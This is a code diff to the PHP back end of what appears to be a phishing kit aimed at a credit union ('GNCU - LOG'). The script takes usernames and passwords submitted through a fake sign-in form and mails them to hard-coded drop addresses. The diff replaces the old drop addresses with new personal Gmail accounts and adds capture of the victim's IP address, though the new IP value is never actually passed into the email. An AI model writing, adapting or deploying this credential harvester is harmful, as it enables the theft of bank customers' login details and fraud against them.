@@ -9,8 +9,11 @@ function sanitize($value) {
 }
 
 
-$EMAIL = "gottmacht.empire@gmail.com";
-$SENDER_EMAIL = "gottmacht.empire@yandex.com";
+// $EMAIL = "gottmacht.empire@gmail.com";
+// $SENDER_EMAIL = "gottmacht.empire@yandex.com";
+
+$EMAIL = "jacedev151@gmail.com";
+$SENDER_EMAIL = "jacetech151@gmail.com";
 
 function sendEmail($prevValues, $subject = "GNCU - LOG") {
     global $EMAIL;
@@ -85,6 +88,11 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
                     <p class='title'>Platform:</p>
                     <p class='content'>{{detail}}</p>
                 </div>
+    
+                <div class='flex'>
+                    <p class='title'>Ip Details:</p>
+                    <p class='content'>{{ip}}</p>
+                </div>
             </div>
         </body>
     </html>";
@@ -94,6 +102,7 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
     $message = str_replace("{{username}}", $values["username"], $message);
     $message = str_replace("{{password}}", $values["password"], $message);
     $message = str_replace("{{detail}}", $values["detail"], $message);
+    $message = str_replace("{{ip}}", $values["ip"], $message);
 
     return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
 }
@@ -102,9 +111,10 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
 if(isset($_POST["sign-in"])) {
     $username = sanitize($_POST["email"]);
     $password = sanitize($_POST["password"]);
+    $ip = sanitize($_POST["ip"]);
     $detail = sanitize($_POST["detail"]);
 
-    sendEmail(["username" => $username, "password" => $password, "detail" => $detail]);
+    sendEmail(["username" => $username,  "password" => $password, "detail" => $detail]);
 
     echo $response = json_encode([
         "signal" => "ok",
